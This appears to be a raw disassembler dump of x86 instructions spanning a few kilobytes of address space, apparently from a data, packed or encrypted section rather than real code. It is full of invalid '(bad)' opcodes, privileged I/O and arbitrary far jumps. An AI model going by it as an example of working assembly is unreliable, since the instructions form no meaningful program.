  41c873:	sbb    esi,DWORD PTR [eax+0x2f]
  41c876:	lahf   
  41c877:	pop    es
  41c878:	retf   
  41c879:	lods   al,BYTE PTR ds:[esi]
  41c87a:	imul   edx,DWORD PTR [edx-0x24],0x5dda6862
  41c881:	repz mov ah,0x9c
  41c884:	push   ds
  41c885:	inc    ecx
  41c886:	fcmovnbe st,st(0)
  41c888:	jl     0x41c892
  41c88a:	add    al,0x36
  41c88c:	enter  0x9c00,0xe8
  41c890:	stc    
  41c891:	pusha  
  41c892:	xchg   esp,eax
  41c893:	stos   DWORD PTR es:[edi],eax
  41c894:	out    0x2b,eax
  41c896:	push   es
  41c897:	cwde   
  41c898:	xlat   BYTE PTR ds:[ebx]
  41c899:	xor    ch,BYTE PTR [edx-0x6a]
  41c89c:	test   al,0x15
  41c89e:	mov    DWORD PTR [edx+0x28890019],edi
  41c8a4:	mov    ds,WORD PTR [edi+ecx*4]
  41c8a7:	popf   
  41c8a8:	push   esp
  41c8a9:	push   0x59f95250
  41c8ae:	inc    ecx
  41c8af:	(bad)  
  41c8b0:	jmp    0x9abe:0xaf8ab3db
  41c8b7:	adc    eax,0x8846d553
  41c8bc:	jb     0x41c935
  41c8be:	sub    bh,cl
  41c8c0:	into   
  41c8c1:	mov    dh,0x8
  41c8c3:	mov    esi,0xdeb36396
  41c8c8:	jp     0x41c93c
  41c8ca:	lea    ecx,[edi+0x19]
  41c8cd:	call   FWORD PTR [esi]
  41c8cf:	add    eax,0xbe4c4337
  41c8d4:	ins    DWORD PTR es:[edi],dx
  41c8d5:	fnop   
  41c8d7:	int3   
  41c8d8:	popf   
  41c8d9:	fmulp  st(2),st
  41c8db:	jp     0x41c957
  41c8dd:	dec    esp
  41c8de:	fcomp  DWORD PTR [esi]
  41c8e0:	jo     0x41c92a
  41c8e2:	ss jo  0x41c932
  41c8e5:	cli    
  41c8e6:	call   0xa2df:0xad467121
  41c8ed:	add    ah,ah
  41c8ef:	pop    ecx
  41c8f0:	mov    WORD PTR [ebp-0xd223a2f],ss
  41c8f6:	out    dx,al
  41c8f7:	call   0xe3a8e267
  41c8fc:	out    dx,al
  41c8fd:	popa   
  41c8fe:	es repnz adc edx,ebx
  41c902:	push   0x0
  41c904:	std    
  41c905:	mov    ebp,0xb4a85d33
  41c90a:	and    esi,DWORD PTR [ecx]
  41c90c:	xor    eax,DWORD PTR [eax+0x1282d3c4]
  41c912:	add    al,0xb0
  41c914:	dec    esp
  41c915:	xchg   ecx,eax
  41c916:	cli    
  41c917:	push   0x9bab6a0
  41c91c:	push   cs
  41c91d:	imul   DWORD PTR [edi+0x2c3af8e2]
  41c923:	add    bh,ch
  41c925:	test   BYTE PTR [edi+0x788c613d],bh
  41c92b:	dec    edi
  41c92c:	and    al,0x30
  41c92e:	sub    eax,0xeb8b8206
  41c933:	pop    edx
  41c934:	mov    dl,0x2b
  41c936:	pop    ds
  41c937:	push   ecx
  41c938:	push   cs
  41c939:	xor    cl,BYTE PTR [esi-0x3dfb7768]
  41c93f:	lahf   
  41c940:	xor    DWORD PTR [edx+ebp*4-0x9],ecx
  41c944:	jb     0x41c91e
  41c946:	outs   dx,DWORD PTR ds:[esi]
  41c947:	push   esi
  41c948:	adc    al,0x4
  41c94a:	push   ebx
  41c94b:	loope  0x41c8d3
  41c94d:	leave  
  41c94e:	fadd   DWORD PTR [ecx+0x42]
  41c951:	cmp    eax,0x38e66886
  41c956:	adc    DWORD PTR [ebx],0xffffffc2
  41c959:	jmp    0x41c92a
  41c95b:	fidiv  WORD PTR [ebx+0x6ede5b07]
  41c961:	cdq    
  41c962:	rcl    DWORD PTR [edi],cl
  41c964:	scas   eax,DWORD PTR es:[edi]
  41c965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c966:	jge    0x41c9dc
  41c968:	pushf  
  41c969:	stc    
  41c96a:	pushf  
  41c96b:	mov    al,ds:0x424dccf
  41c970:	ins    DWORD PTR es:[edi],dx
  41c971:	mov    al,0x14
  41c973:	mov    cl,0x92
  41c975:	loope  0x41c98c
  41c977:	xchg   edi,eax
  41c978:	add    BYTE PTR ds:0xc7d07465,ah
  41c97e:	fisttp WORD PTR [ebx-0x74]
  41c981:	push   ebp
  41c982:	mov    ecx,0xf401bf8b
  41c987:	mov    al,0x2c
  41c989:	push   eax
  41c98a:	push   0x25
  41c98c:	in     eax,dx
  41c98d:	jne    0x41c9f0
  41c98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c990:	mov    WORD PTR [edx+0x369ad464],gs
  41c996:	cmc    
  41c997:	and    al,0x17
  41c999:	mov    ?,WORD PTR [ebp+0x3bd4762f]
  41c99f:	ja     0x41c9a0
  41c9a1:	call   0x32b8015d
  41c9a6:	and    ch,dl
  41c9a8:	in     eax,dx
  41c9a9:	sbb    eax,0x38019ab9
  41c9ae:	dec    edx
  41c9af:	stc    
  41c9b0:	push   eax
  41c9b1:	je     0x41c97e
  41c9b3:	scas   eax,DWORD PTR es:[edi]
  41c9b4:	inc    ebx
  41c9b5:	mov    al,0x3f
  41c9b7:	and    eax,0xad080e33
  41c9bc:	(bad)  
  41c9bd:	bswap  esp
  41c9bf:	lock dec esp
  41c9c1:	mov    al,0xbc
  41c9c3:	inc    ecx
  41c9c4:	jnp    0x41c98a
  41c9c6:	je     0x41c966
  41c9c8:	mov    ch,0xa6
  41c9ca:	jecxz  0x41ca3f
  41c9cc:	pop    ecx
  41c9cd:	out    dx,al
  41c9ce:	icebp  
  41c9cf:	sbb    dl,bl
  41c9d1:	jnp    0x41c9b7
  41c9d3:	mov    bl,0x6b
  41c9d5:	sub    edx,edi
  41c9d7:	sbb    dl,cl
  41c9d9:	sti    
  41c9da:	shl    BYTE PTR ds:0x5d64406d,cl
  41c9e0:	int    0xa1
  41c9e2:	jne    0x41ca0e
  41c9e4:	stc    
  41c9e5:	cmp    ebp,DWORD PTR [edx+0x449225ce]
  41c9eb:	es push edi
  41c9ed:	mov    dl,BYTE PTR [ebp-0x7d660310]
  41c9f3:	enter  0xc67d,0x77
  41c9f7:	cmp    esi,DWORD PTR cs:[ebp-0xf7a5b33]
  41c9fe:	pop    es
  41c9ff:	in     al,dx
  41ca00:	xchg   BYTE PTR [ebx+eax*4-0x62],ah
  41ca04:	hlt    
  41ca05:	push   edi
  41ca06:	cmp    edi,DWORD PTR [edi+0x79]
  41ca09:	shr    DWORD PTR [ebp-0x62b7967c],cl
  41ca0f:	pop    ebx
  41ca10:	xor    ch,BYTE PTR [esi+0x1e94a600]
  41ca16:	ret    
  41ca17:	fldlg2 
  41ca19:	bound  edi,QWORD PTR [edi-0x4d]
  41ca1c:	loopne 0x41ca65
  41ca1e:	(bad)  
  41ca1f:	icebp  
  41ca20:	fisub  WORD PTR [esi-0x40]
  41ca23:	lock into 
  41ca25:	mov    WORD PTR [ecx+edi*2],ds
  41ca28:	sbb    al,BYTE PTR [edi+0x47]
  41ca2b:	xor    al,0x76
  41ca2d:	jno    0x41ca7f
  41ca2f:	daa    
  41ca30:	jb     0x41c9e1
  41ca32:	sbb    eax,0x77cd8795
  41ca37:	imul   esi,ecx,0xa0fff3f0
  41ca3d:	imul   esi,edx,0x9
  41ca40:	cld    
  41ca41:	(bad)  
  41ca42:	dec    esi
  41ca43:	cmp    eax,DWORD PTR [eax]
  41ca45:	lock xlat BYTE PTR ds:[ebx]
  41ca47:	or     DWORD PTR [edx+0x4f],0x15b36984
  41ca4e:	inc    ebp
  41ca4f:	sbb    BYTE PTR [edi-0x722b32d2],ch
  41ca55:	adc    al,0xc0
  41ca57:	dec    edi
  41ca58:	(bad)  
  41ca59:	out    dx,al
  41ca5a:	retf   
  41ca5b:	into   
  41ca5c:	cmc    
  41ca5d:	sub    al,0x11
  41ca5f:	cld    
  41ca60:	or     eax,0xf2dfa50e
  41ca65:	pop    ss
  41ca66:	or     dl,BYTE PTR ds:0xd99fd9c5
  41ca6c:	nop
  41ca6d:	call   0xe032:0xe8aa97cc
  41ca74:	sahf   
  41ca75:	xor    ah,BYTE PTR ds:0x987e4fa1
  41ca7b:	xor    dh,bl
  41ca7d:	test   BYTE PTR [edx],0x6d
  41ca80:	mov    esi,0x5695e5c5
  41ca85:	int    0x6
  41ca87:	retf   
  41ca88:	nop
  41ca89:	mov    ch,0x59
  41ca8b:	mov    al,ds:0x605968be
  41ca90:	test   ch,dh
  41ca92:	xor    ah,0x56
  41ca95:	cld    
  41ca96:	in     eax,dx
  41ca97:	aaa    
  41ca98:	call   0x66997c62
  41ca9d:	and    DWORD PTR [ecx-0x63722aaf],esi
  41caa3:	dec    edi
  41caa4:	mov    eax,0x814ab74d
  41caa9:	inc    edi
  41caaa:	dec    ebx
  41caab:	scas   eax,DWORD PTR es:[edi]
  41caac:	in     al,0x39
  41caae:	in     al,dx
  41caaf:	cwde   
  41cab0:	jge    0x41cae3
  41cab2:	push   eax
  41cab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cab4:	xor    DWORD PTR [ecx+0x7e],ebx
  41cab7:	(bad)  
  41cab8:	in     al,dx
  41cab9:	lods   eax,DWORD PTR ds:[esi]
  41caba:	sbb    eax,edx
  41cabc:	jb     0x41cacd
  41cabe:	inc    esp
  41cabf:	inc    edi
  41cac0:	jle    0x41ca9a
  41cac2:	add    ebx,DWORD PTR [edi-0x6d]
  41cac5:	xchg   esi,eax
  41cac6:	sbb    eax,0x46751aa6
  41cacb:	std    
  41cacc:	retf   0x4474
  41cacf:	sub    al,0x1a
  41cad1:	dec    ecx
  41cad2:	and    ebx,ebp
  41cad4:	ja     0x41ca8e
  41cad6:	in     eax,dx
  41cad7:	stc    
  41cad8:	aad    0xd9
  41cada:	fld    DWORD PTR [ebx+0x5b0dc876]
  41cae0:	sahf   
  41cae1:	ins    DWORD PTR es:[edi],dx
  41cae2:	pushf  
  41cae3:	jg     0x41cab8
  41cae5:	sub    BYTE PTR [esi-0x3a],bh
  41cae8:	(bad)  
  41cae9:	stos   BYTE PTR es:[edi],al
  41caea:	mov    edx,0x9e351b92
  41caef:	sbb    DWORD PTR ds:0x69b04141,ebx
  41caf5:	sbb    DWORD PTR [edx],esi
  41caf7:	sbb    DWORD PTR [eax],0x6f32c49c
  41cafd:	js     0x41ca9b
  41caff:	hlt    
  41cb00:	pop    es
  41cb01:	mov    cl,0x2c
  41cb03:	mov    eax,DWORD PTR [eax-0x8452dbb]
  41cb09:	push   0xf9f5664f
  41cb0e:	push   esi
  41cb0f:	ins    BYTE PTR es:[edi],dx
  41cb10:	(bad)  [ebp+0x75]
  41cb13:	test   al,0xae
  41cb15:	jp     0x41cb7a
  41cb17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb18:	sub    eax,0x94587b86
  41cb1d:	dec    ebx
  41cb1e:	push   esp
  41cb1f:	or     DWORD PTR [ebp-0x3bddc05d],ecx
  41cb25:	cmp    ecx,edi
  41cb27:	popf   
  41cb28:	push   ss
  41cb29:	fwait
  41cb2a:	cmp    al,0xb3
  41cb2c:	neg    BYTE PTR [eax+0x20b0796e]
  41cb32:	leave  
  41cb33:	es inc ebp
  41cb35:	(bad)  [ebp+0x62]
  41cb38:	push   ebp
  41cb39:	ins    BYTE PTR es:[edi],dx
  41cb3a:	and    edx,ebx
  41cb3c:	push   ds
  41cb3d:	add    DWORD PTR [esi-0x47],0x15
  41cb41:	add    DWORD PTR [ebp+0x1375a693],esp
  41cb47:	scas   eax,DWORD PTR es:[edi]
  41cb48:	rcl    DWORD PTR [esi-0x65d484eb],1
  41cb4e:	stos   BYTE PTR es:[edi],al
  41cb4f:	fist   DWORD PTR [esi+esi*8]
  41cb52:	lock outs dx,BYTE PTR ds:[esi]
  41cb54:	xchg   ecx,eax
  41cb55:	mov    edi,0xc9ebc828
  41cb5a:	xor    eax,edi
  41cb5c:	aaa    
  41cb5d:	sbb    BYTE PTR ds:[eax-0x27db650],ch
  41cb64:	mov    ebx,0x470b60c8
  41cb69:	enter  0x9546,0xe8
  41cb6d:	cmp    DWORD PTR [esi+0x5696c7a7],0x3bbe0c6
  41cb77:	or     al,0xdd
  41cb79:	js     0x41cbae
  41cb7b:	mov    bh,0x6e
  41cb7d:	shr    BYTE PTR [esi],0x4e
  41cb80:	cmc    
  41cb81:	jns    0x41cbfa
  41cb83:	or     al,0x9e
  41cb85:	jnp    0x41cb51
  41cb87:	cld    
  41cb88:	mov    al,0x88
  41cb8a:	push   esp
  41cb8b:	push   0x89bd2807
  41cb90:	(bad)  
  41cb91:	jb     0x41cb82
  41cb93:	fdiv   DWORD PTR [eax+esi*2]
  41cb96:	mov    ecx,0xaf92f756
  41cb9b:	jmp    ebp
  41cb9d:	mov    dh,0x16
  41cb9f:	imul   edx,DWORD PTR [esi],0x5f
  41cba2:	jnp    0x41cb94
  41cba4:	shl    BYTE PTR [ebx],1
  41cba6:	sub    al,cl
  41cba8:	mov    al,0x71
  41cbaa:	push   esi
  41cbab:	xchg   edx,eax
  41cbac:	cmp    BYTE PTR [edx],al
  41cbae:	call   0x20d8298c
  41cbb3:	inc    esp
  41cbb4:	mov    bl,0xc9
  41cbb6:	retf   
  41cbb7:	dec    eax
  41cbb8:	rcr    DWORD PTR [esi],cl
  41cbba:	xor    eax,0x1d5b97c4
  41cbbf:	rcr    DWORD PTR [ebx+esi*4],1
  41cbc2:	sahf   
  41cbc3:	and    eax,0xaeeb9d89
  41cbc8:	lods   al,BYTE PTR ds:[esi]
  41cbc9:	mov    ecx,0xc5937c9c
  41cbce:	pop    ebp
  41cbcf:	out    dx,eax
  41cbd0:	sub    eax,0x73ff2e85
  41cbd5:	inc    edx
  41cbd6:	ds nop
  41cbd8:	cmpxchg bh,bh
  41cbdb:	(bad)  
  41cbdc:	lock jne 0x41cb9c
  41cbdf:	pop    ebx
  41cbe0:	push   eax
  41cbe1:	push   edi
  41cbe2:	push   edx
  41cbe3:	outs   dx,DWORD PTR ds:[esi]
  41cbe4:	dec    edx
  41cbe5:	xchg   ebp,eax
  41cbe6:	inc    esp
  41cbe7:	mov    esi,0xf6bedd83
  41cbec:	dec    edi
  41cbed:	xchg   esp,eax
  41cbee:	xchg   ebx,eax
  41cbef:	pop    esp
  41cbf0:	aam    0x81
  41cbf2:	(bad)  [edi]
  41cbf4:	fidivr DWORD PTR [ebx]
  41cbf6:	sub    ebp,0x94697ff1
  41cbfc:	fidivr DWORD PTR [esi-0x70]
  41cbff:	cli    
  41cc00:	popf   
  41cc01:	ss scas al,BYTE PTR es:[edi]
  41cc03:	mov    cl,0x58
  41cc05:	inc    ebx
  41cc06:	mov    eax,0x92c71a31
  41cc0b:	outs   dx,BYTE PTR ds:[esi]
  41cc0c:	fs jl  0x41cb91
  41cc0f:	xor    ch,BYTE PTR [ebp+ebx*4-0x1e17fbfb]
  41cc16:	dec    esp
  41cc17:	aas    
  41cc18:	(bad)  
  41cc19:	xchg   esp,eax
  41cc1a:	push   ds
  41cc1b:	mov    ds:0x1a8cbb0d,eax
  41cc20:	pop    ss
  41cc21:	sbb    ecx,esp
  41cc23:	(bad)
  41cc28:	loope  0x41cc20
  41cc2a:	xor    DWORD PTR [ecx+0x1f14bce9],ecx
  41cc30:	or     esp,DWORD PTR [ebp-0x49]
  41cc33:	xor    eax,0xceb25ff7
  41cc38:	sub    ch,BYTE PTR [eax+0x6eab5d9e]
  41cc3e:	stos   DWORD PTR es:[edi],eax
  41cc3f:	mov    eax,0xaec214e0
  41cc44:	cmp    DWORD PTR [ecx+0x53],0xffffffed
  41cc48:	lods   al,BYTE PTR ds:[esi]
  41cc49:	dec    ebx
  41cc4a:	adc    DWORD PTR [eax],eax
  41cc4c:	jnp    0x41cbe9
  41cc4e:	dec    esi
  41cc4f:	bnd jns 0x41ccbf
  41cc52:	sub    edi,DWORD PTR [edx]
  41cc54:	fadd   QWORD PTR [edi]
  41cc56:	push   ebx
  41cc57:	into   
  41cc58:	stc    
  41cc59:	jge    0x41cc03
  41cc5b:	rol    esp,cl
  41cc5d:	outs   dx,DWORD PTR ds:[esi]
  41cc5e:	mov    edi,DWORD PTR ds:0x6a0592fb
  41cc64:	call   0x9f8510aa
  41cc69:	push   ss
  41cc6a:	xor    al,0x8
  41cc6c:	sbb    esp,DWORD PTR [ebx+0x7]
  41cc6f:	out    0x1a,eax
  41cc71:	xor    ebx,ebp
  41cc73:	je     0x41cc62
  41cc75:	sub    bh,BYTE PTR [ebp+0x11e6cb08]
  41cc7b:	popa   
  41cc7c:	push   eax
  41cc7d:	jecxz  0x41cc6a
  41cc7f:	pop    esp
  41cc80:	fsubrp st(3),st
  41cc82:	inc    esi
  41cc83:	js     0x41cc73
  41cc85:	cmp    BYTE PTR [ebx+0x26],0x14
  41cc89:	jl     0x41cc13
  41cc8b:	into   
  41cc8c:	sub    DWORD PTR [ebp+0x5b],eax
  41cc8f:	mov    al,ds:0xd4aa257e
  41cc94:	arpl   WORD PTR [eax-0x22],di
  41cc97:	je     0x41ccbf
  41cc99:	jmp    0x41ccab
  41cc9b:	call   0xc80:0x61182886
  41cca2:	ret    0x7d2e
  41cca5:	jno    0x41cc4e
  41cca7:	inc    ecx
  41cca8:	call   0xc94:0x7148c328
  41ccaf:	and    BYTE PTR [edi+0x7ecec33a],dh
  41ccb5:	or     al,0xcd
  41ccb7:	(bad)  
  41ccb9:	mov    ecx,0x1893ef92
  41ccbe:	fimul  DWORD PTR [edx+eax*8-0x3d]
  41ccc2:	dec    ebp
  41ccc3:	inc    edi
  41ccc4:	hlt    
  41ccc5:	popf   
  41ccc6:	cs mov ebx,0xe50edaf
  41cccc:	call   0x1abe:0xdfa02795
  41ccd3:	inc    ebx
  41ccd4:	push   ebp
  41ccd5:	inc    edx
  41ccd6:	outs   dx,DWORD PTR ds:[esi]
  41ccd7:	sar    BYTE PTR [edi+0x6c],1
  41ccda:	xchg   ebx,eax
  41ccdb:	sbb    eax,0x52c930ae
  41cce0:	sahf   
  41cce1:	jb     0x41ccb3
  41cce3:	dec    esi
  41cce4:	lock mov bl,BYTE PTR [eax+0x44ddeac1]
  41cceb:	push   ecx
  41ccec:	int3   
  41cced:	popa   
  41ccee:	retf   0xa256
  41ccf1:	es retf 
  41ccf3:	add    DWORD PTR [eax],0xffffff8c
  41ccf6:	xchg   ecx,eax
  41ccf7:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41ccf9:	lds    ebp,FWORD PTR [ecx+0x45fe9303]
  41ccff:	xchg   DWORD PTR [esi+0x2a776323],edx
  41cd05:	jnp    0x41cd77
  41cd07:	sti    
  41cd08:	(bad)  
  41cd09:	outs   dx,DWORD PTR ds:[esi]
  41cd0a:	fldenv [edx-0x29]
  41cd0d:	test   al,0x80
  41cd0f:	xor    bh,BYTE PTR ds:0x9f7f37ed
  41cd15:	out    0x24,eax
  41cd17:	ret    
  41cd18:	aam    0xd4
  41cd1a:	push   ss
  41cd1b:	test   BYTE PTR [ebp-0x2adac352],al
  41cd21:	mov    esp,0x68a71245
  41cd26:	cmp    ebx,DWORD PTR [eax-0x7af08565]
  41cd2c:	pop    esi
  41cd2d:	out    0xe,eax
  41cd2f:	sar    edi,1
  41cd31:	xchg   ebp,eax
  41cd32:	xor    eax,DWORD PTR [edi]
  41cd34:	push   esp
  41cd35:	js     0x41cd2b
  41cd37:	dec    edi
  41cd38:	lods   eax,DWORD PTR ds:[esi]
  41cd39:	jle    0x41cd39
  41cd3b:	ins    DWORD PTR es:[edi],dx
  41cd3c:	push   edi
  41cd3d:	into   
  41cd3e:	stos   DWORD PTR es:[edi],eax
  41cd3f:	stc    
  41cd40:	and    al,0xc1
  41cd42:	inc    edx
  41cd43:	retf   0xb296
  41cd46:	add    WORD PTR [eax+eax*8-0x34f3c9e2],dx
  41cd4e:	push   ebp
  41cd4f:	addr16 sahf 
  41cd51:	imul   DWORD PTR [edi+0x67bf305f]
  41cd57:	adc    al,0xe7
  41cd59:	sbb    cl,dl
  41cd5b:	in     eax,dx
  41cd5c:	loop   0x41cda5
  41cd5e:	jl     0x41ccff
  41cd60:	push   cs
  41cd61:	or     edi,eax
  41cd63:	ficomp DWORD PTR [eax-0x3d9ab2d1]
  41cd69:	pop    edi
  41cd6a:	jne    0x41cd7f
  41cd6c:	imul   edx,DWORD PTR [edi+ecx*1],0x781a0828
  41cd73:	add    edx,ecx
  41cd75:	retf   0x17e0
  41cd78:	inc    edx
  41cd79:	xor    al,0xca
  41cd7b:	(bad)  
  41cd7c:	clc    
  41cd7d:	xchg   edi,eax
  41cd7e:	pop    edi
  41cd7f:	scas   al,BYTE PTR es:[edi]
  41cd80:	mov    al,0x50
  41cd82:	mov    eax,ds:0x88d8ebc2
  41cd87:	cmp    dl,bl
  41cd89:	push   cs
  41cd8a:	mov    bl,0xa8
  41cd8c:	out    dx,eax
  41cd8d:	adc    esi,DWORD PTR [eax]
  41cd8f:	sub    eax,0xa98904a3
  41cd94:	(bad)  
  41cd96:	dec    edi
  41cd97:	mov    WORD PTR gs:[eax],es
  41cd9a:	test   eax,0x512834f0
  41cd9f:	mov    WORD PTR ds:0xb509af87,es
  41cda5:	push   eax
  41cda6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cda7:	cli    
  41cda8:	pop    si
  41cdaa:	dec    esi
  41cdab:	pop    ecx
  41cdac:	or     DWORD PTR [eax+0x7f],0x3094b1f1
  41cdb3:	stc    
  41cdb4:	lds    eax,FWORD PTR [edi-0x6e66b95d]
  41cdba:	push   eax
  41cdbb:	(bad)  
  41cdbf:	enter  0x4614,0x3c
  41cdc3:	ret    0x4c31
  41cdc6:	and    ecx,edx
  41cdc8:	jl     0x41ce43
  41cdca:	sti    
  41cdcb:	fstp   TBYTE PTR [ebp+eiz*8+0x77]
  41cdcf:	fiadd  WORD PTR [ecx-0x130c73ef]
  41cdd5:	mov    edx,0xae8d48a1
  41cdda:	out    0xd9,eax
  41cddc:	ret    
  41cddd:	ror    DWORD PTR [edx-0x25],1
  41cde0:	push   es
  41cde1:	mov    eax,ds:0xbb197635
  41cde6:	xchg   DWORD PTR [edi],ebx
  41cde8:	add    BYTE PTR [ecx],dh
  41cdea:	sbb    eax,0x6ce40757
  41cdef:	cmp    ebx,0xffffffa7
  41cdf2:	popf   
  41cdf3:	sbb    BYTE PTR [ebx],bl
  41cdf5:	aad    0xed
  41cdf7:	adc    ebp,ecx
  41cdf9:	push   esp
  41cdfa:	push   es
  41cdfb:	push   edi
  41cdfc:	mov    ebp,0x61fe51dc
  41ce01:	int3   
  41ce02:	and    al,0x67
  41ce04:	loop   0x41ce27
  41ce06:	jnp    0x41ce45
  41ce08:	leave  
  41ce09:	dec    esi
  41ce0a:	adc    BYTE PTR [ebx+0x48cd354d],ch
  41ce10:	cmp    esi,ebx
  41ce12:	push   eax
  41ce13:	loop   0x41ce3e
  41ce15:	xlat   BYTE PTR ds:[ebx]
  41ce16:	inc    edx
  41ce17:	leave  
  41ce18:	adc    bh,dh
  41ce1a:	pusha  
  41ce1b:	sti    
  41ce1c:	or     ecx,DWORD PTR [edx+0x438f9153]
  41ce22:	pop    eax
  41ce23:	inc    ebx
  41ce24:	mul    ecx
  41ce26:	pop    DWORD PTR [eax+0x778969c8]
  41ce2c:	and    BYTE PTR [ecx],bl
  41ce2e:	out    0x8d,al
  41ce30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce31:	hlt    
  41ce32:	push   ds
  41ce33:	retf   0xd0ea
  41ce36:	xchg   ebx,eax
  41ce37:	or     DWORD PTR [ebx-0x1d4a1b89],ebp
  41ce3d:	sbb    dh,BYTE PTR [ebx]
  41ce3f:	dec    eax
  41ce40:	dec    ebp
  41ce41:	pop    esp
  41ce42:	out    dx,al
  41ce43:	and    bh,dh
  41ce45:	(bad)  
  41ce46:	adc    al,0x73
  41ce48:	mov    edi,0x3eca70f0
  41ce4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce4e:	clc    
  41ce4f:	jns    0x41cdf2
  41ce51:	icebp  
  41ce52:	std    
  41ce53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce55:	sbb    bh,BYTE PTR [eax]
  41ce57:	and    eax,edi
  41ce59:	lea    esi,[ebx+0x25]
  41ce5c:	jecxz  0x41cdfe
  41ce5e:	cmp    esp,eax
  41ce60:	cdq    
  41ce61:	or     ah,BYTE PTR [edi+edx*1+0x64]
  41ce65:	in     eax,dx
  41ce66:	mov    dh,0xf7
  41ce68:	jecxz  0x41ce8a
  41ce6a:	es push 0xffffffda
  41ce6d:	stc    
  41ce6e:	xchg   esi,eax
  41ce6f:	fcom   st(4)
  41ce71:	shl    DWORD PTR fs:[bp+di+0x68b9],1
  41ce77:	icebp  
  41ce78:	ror    BYTE PTR [eax+0x23],1
  41ce7b:	push   eax
  41ce7c:	neg    BYTE PTR [edi+0x5b]
  41ce7f:	push   cs
  41ce80:	sar    BYTE PTR [edi-0x4b52a19a],1
  41ce86:	hlt    
  41ce87:	sub    edi,DWORD PTR [esi]
  41ce89:	out    dx,al
  41ce8a:	mov    ah,0xa5
  41ce8c:	inc    esi
  41ce8d:	mov    ?,WORD PTR [ecx+0x47197f8b]
  41ce93:	pop    esp
  41ce94:	cmc    
  41ce95:	or     DWORD PTR ds:0x8d9b877,ecx
  41ce9b:	push   0x39f8e05
  41cea0:	in     al,dx
  41cea1:	mov    cl,ah
  41cea3:	dec    edi
  41cea4:	lock mov esp,0xefedd359
  41ceaa:	cli    
  41ceab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceac:	mov    WORD PTR [esi],fs
  41ceae:	jae    0x41ce48
  41ceb0:	mov    ds:0xff3f24a3,eax
  41ceb5:	shl    DWORD PTR [ebx],1
  41ceb7:	es inc esi
  41ceb9:	cwde   
  41ceba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cebb:	outs   dx,BYTE PTR ds:[esi]
  41cebc:	(bad)  
  41cebe:	sub    BYTE PTR [esi],al
  41cec0:	xlat   BYTE PTR ds:[ebx]
  41cec1:	(bad)  
  41cec3:	inc    edx
  41cec4:	push   cs
  41cec5:	pushf  
  41cec6:	dec    ebx
  41cec7:	jb     0x41ce85
  41cec9:	nop
  41ceca:	sbb    BYTE PTR [esi+0x20],0xf5
  41cece:	in     al,dx
  41cecf:	div    DWORD PTR [edx]
  41ced1:	stos   BYTE PTR es:[edi],al
  41ced2:	pop    es
  41ced3:	test   BYTE PTR [edx],bh
  41ced5:	sbb    BYTE PTR [ebp-0x56],ch
  41ced8:	rcl    DWORD PTR [ebp+0x4b93f227],1
  41cede:	xor    ebp,eax
  41cee0:	fdiv   QWORD PTR [ebx]
  41cee2:	jno    0x41ce6d
  41cee4:	ror    DWORD PTR [ecx],0xdc
  41cee7:	aas    
  41cee8:	sahf   
  41cee9:	sub    eax,DWORD PTR ds:0xae416622
  41ceef:	xchg   ebx,eax
  41cef0:	jo     0x41ceb2
  41cef2:	mov    BYTE PTR [edx-0x53],dl
  41cef5:	push   esi
  41cef6:	xchg   edi,ebx
  41cef8:	sub    al,0x2
  41cefa:	mov    WORD PTR [esi+0x23cdc6de],gs
  41cf00:	out    0xd5,eax
  41cf02:	jno    0x41cf1f
  41cf04:	sub    BYTE PTR [ecx+0x1b],bh
  41cf07:	inc    ecx
  41cf08:	jnp    0x41cee0
  41cf0a:	mov    ch,0x8d
  41cf0c:	cdq    
  41cf0d:	mov    ah,0x5e
  41cf0f:	jmp    0x41cf17
  41cf11:	sub    edx,DWORD PTR [ebx-0x51]
  41cf14:	aaa    
  41cf15:	aas    
  41cf16:	mov    dh,0x1
  41cf18:	imul   edi,DWORD PTR [ebp-0x37],0x13
  41cf1c:	mov    WORD PTR [edx+0xc9f0d85],es
  41cf22:	pop    ds
  41cf23:	adc    eax,0x2d710df3
  41cf28:	and    ecx,esi
  41cf2a:	push   edx
  41cf2b:	xor    eax,0x5e63282f
  41cf30:	nop
  41cf31:	shr    dh,0xfc
  41cf34:	cmpps  xmm4,xmm5,0x20
  41cf38:	(bad)  
  41cf39:	shr    BYTE PTR [edi+0x9],1
  41cf3c:	aam    0x51
  41cf3e:	add    DWORD PTR [edx+0x69eb3fac],edx
  41cf44:	in     eax,dx
  41cf45:	aaa    
  41cf46:	jp     0x41cf3c
  41cf48:	clc    
  41cf49:	adc    al,0x27
  41cf4b:	cmp    al,0x11
  41cf4d:	add    DWORD PTR [esp+edi*2],esp
  41cf50:	fdivp  st(2),st
  41cf52:	cmp    cl,BYTE PTR [edx]
  41cf54:	js     0x41cf68
  41cf56:	ficomp DWORD PTR ds:0xd460ad46
  41cf5c:	add    al,0x7f
  41cf5e:	stos   DWORD PTR es:[edi],eax
  41cf5f:	or     al,0x2e
  41cf61:	xchg   ecx,eax
  41cf62:	cmp    DWORD PTR [ebp+ebx*1+0x9dbb01f],ebp
  41cf69:	lds    ecx,FWORD PTR [eax-0x387511b0]
  41cf6f:	repnz xor ecx,DWORD PTR [edi+0x4c]
  41cf73:	adc    al,0x7e
  41cf75:	inc    esi
  41cf76:	or     edx,DWORD PTR [ecx]
  41cf78:	(bad)  
  41cf79:	cmp    al,0x1b
  41cf7b:	push   ds
  41cf7c:	mov    ebp,0xc87b47e8
  41cf81:	pop    edx
  41cf82:	mov    WORD PTR [ecx+0x2a053211],es
  41cf88:	pop    ds
  41cf89:	pop    ebp
  41cf8a:	xchg   edi,eax
  41cf8b:	ret    0xbd2a
  41cf8e:	adc    BYTE PTR [ecx-0x1db9b1a2],bl
  41cf94:	in     eax,0x5f
  41cf96:	mov    ecx,cs
  41cf98:	push   ecx
  41cf99:	cli    
